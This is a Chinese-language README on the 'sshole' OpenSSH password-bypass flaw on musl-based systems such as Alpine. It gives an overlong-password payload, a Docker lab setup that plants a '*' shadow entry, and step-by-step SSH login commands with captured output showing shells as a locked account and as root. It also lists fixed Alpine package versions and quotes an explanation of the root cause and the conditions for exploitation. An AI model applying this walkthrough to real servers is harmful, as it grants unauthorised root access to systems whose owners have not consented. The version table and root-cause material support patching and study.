# 写在前面
sshole是一个openssh密码绕过漏洞，在一定条件下，能够绕过密码检测直接登录目标账户
> **免责声明**：本项目仅供网络安全学习、漏洞原理研究与已授权的本地环境测试使用。请勿用于任何未授权的非法攻击，否则后果自负。

# Payload
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

# 修复的版本
|Alpine版本|修复的版本|
|---|---|
|edge|10.6_p2-r0|
|3.24|10.3_p1-r2|
|3.23|10.2_p1-r1|
|3.22|10.0_p1-r11|
|3.21|9.9_p2-r1|
|3.20|9.7_p1-r6|
|3.19|9.6_p1-r3|
|3.18|9.3_p2-r4|
|3.17|9.1_p1-r7|
|3.16|9.0_p1-r6|

# 不更改配置文件的情况（PermitRootLogin prohibit-password）
## 环境搭建
```
# 启动alpine带漏洞版本的openssh的docker
docker run -it --name sshole -p 2222:22 bengt/alpine-openssh:alpine-3.20 /bin/sh

# 检查版本号
ssh -V

# 生成SSH服务器的主机密钥对
ssh-keygen -A

# 检查配置文件
# 主要关注root账户是否允许密码登录
cat /etc/ssh/sshd_config | grep PasswordAuthentication

# 创建密码为*的用户
adduser -D keyonly

# 并将密码改为*
sed -i 's/^keyonly:[^:]*:/keyonly:*:/' /etc/shadow

# 确认已经创建成功
grep '^keyonly:' /etc/shadow

# 创建真实的用户
adduser -D realuser

# 设置用户密码（密码任意）
passwd realuser

# 启动sshd
/usr/sbin/sshd -D -e
```

## 漏洞利用
新开一个终端
```
# ssh连接
ssh keyonly@localhost -p 2222
```
第一次输入任意字符，第二次输入密码时，输入257到1024个字符的密码

结果如下
```
┌──(hel1um17㉿kali)-[~]
└─$ ssh keyonly@localhost -p 2222
keyonly@localhost's password: 
Permission denied, please try again.
keyonly@localhost's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

6c6c3adf35cc:~$ ls
6c6c3adf35cc:~$ whoami
keyonly
6c6c3adf35cc:~$
```
此时即登录目标账户

# 更改配置文件的情况（PermitRootLogin yes）
## 环境搭建
前面直至启动sshd的步骤一模一样，启动时使用：
```
/usr/sbin/sshd -D -e -o PermitRootLogin=yes
```

## 漏洞利用
新开一个终端
```
# ssh连接
ssh root@localhost -p 2222
```
第一次输入任意字符，第二次输入密码时，输入257到1024个字符的密码

结果如下
```
┌──(hel1um17㉿kali)-[~/Downloads]
└─$ ssh root@localhost -p 2222
root@localhost's password: 
Permission denied, please try again.
root@localhost's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

6c6c3adf35cc:~# whoami
root
6c6c3adf35cc:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

# 漏洞成因
> 摘录于[OpenSSH 严重绕过漏洞“sshole”让任意超长密码都能登录 root](https://www.oschina.net/news/503439/openssh-sshhole)
```
1980 年，Bill Joy 在 BSD Unix 的 /etc/passwd 里给 daemon 账号的密码字段填了一个 *。* 不是一个哈希值，所以任何密码都算不出来跟它匹配——这个账号从此无法用密码登录。这个做法沿用至今。

1990 年代，密码哈希搬到了 /etc/shadow，格式是 $6$abc$k2P9…（$6$ 表示 sha512，abc 是盐值，后面是哈希）。sshd 拿到你输入的密码，用同样的盐值算一遍，结果相同就放行。如果字段只是个 *，那就没什么可匹配的——你输什么都进不去。

但有个细节：单 Unix 规范里写着，如果 crypt() 无法完成计算，它返回 NULL。比如盐值要求了系统没有的算法。很多程序不检查 NULL，直接拿返回值跟存储字段比，一碰就崩。

2012 年，musl libc（Alpine Linux 用的那个）决定不让 crypt() 返回 NULL 了。算不出来怎么办？返回一个单字符。那个字符永远匹配不上真实密码，程序不会崩，只是看到"密码错误"。

他们选的那个字符是 *。

三周后，musl 加上了 sha512 crypt。问题是它越长的密码算得越慢，有人可以用超长密码把服务器拖住。于是 musl 把密码上限压到 256 字节，超了直接失败。

失败的时候返回什么？

还是 *。

2016 年，漏洞真正成型
这一年 OpenSSH 修了个信息泄露问题（CVE-2016-6210）：攻击者可以通过响应时间判断哪些账号存在——不存在的用户 sshd 立刻拒绝，真实用户要算一遍哈希慢几毫秒。

修法有点好笑。既然没有真实哈希可算，那 sshd 就抓另一个账号的盐值，照样把你输的密码哈希一遍，纯粹为了浪费同样的时间。"还是不行，只是慢一点的'不行'。"

这个改动顺带让 sshd 对"密码字段是 *"的账号也走了同样的路径。

到这里，三个条件凑齐了：musl 的 crypt() 返回 * + sshd 会给 * 账号算哈希 + 超长密码让 crypt() 失败。

结果就是：一个本该永远锁死的账号，只要你输入 257 到 1024 个字符的密码，crypt() 返回 *，跟 shadow 里的 * 一比——匹配成功，进。
```

# 利用条件
> 摘录于[OpenSSH 严重绕过漏洞“sshole”让任意超长密码都能登录 root](https://www.oschina.net/news/503439/openssh-sshhole)
```
1、sshd 跑在 musl 上（Alpine、OpenWrt、Buildroot、Yocto，以及你 pull 的很多 Docker 镜像）
2、不走 PAM（Alpine 的 openssh-server 默认就不用）
3、密码登录还开着（默认开着）
4、有一个密码字段是纯 * 的账号（key-only 用户、LDAP 用户、Alpine 上的 root）
4、还有另一个有真实密码的账号
```
> 注意，默认情况下，`root`账户是无法直接用密码登陆的，也就是配置文件`/etc/ssh/sshd_config`中的`PermitRootLogin prohibit-password`

# 参考资料
[sshhole.com](https://sshhole.com/)

[OpenSSH 严重绕过漏洞“sshole”让任意超长密码都能登录 root](https://www.oschina.net/news/503439/openssh-sshhole)

[OpenSSH/musl密码认证绕过漏洞安全风险通告](https://www.secrss.com/articles/95412)